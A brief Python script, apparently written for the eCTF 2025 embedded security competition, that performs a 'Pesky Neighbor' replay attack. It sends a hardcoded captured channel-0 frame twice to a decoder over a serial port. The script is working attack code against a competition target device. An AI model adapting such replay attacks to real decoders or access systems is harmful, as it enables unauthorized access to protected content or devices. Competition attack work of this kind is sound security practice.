import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    lgmt_frame_channel0 = b'>\xb9}\x8e\x8aA\xe8\x8f\xbe\xe6\xf8"\xc7j\r\x9e\xdfT\xe757X\xd5\tK\xf7\xd5\x12$\x8eP*\x10FY\xc9\x88_\x8e{\xaa\xbeDuY\xaf\x1a\xc4r\xe9c\xd2sw\x96\xff\xb5\xb9\xf4j$\xee\xe1$'
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")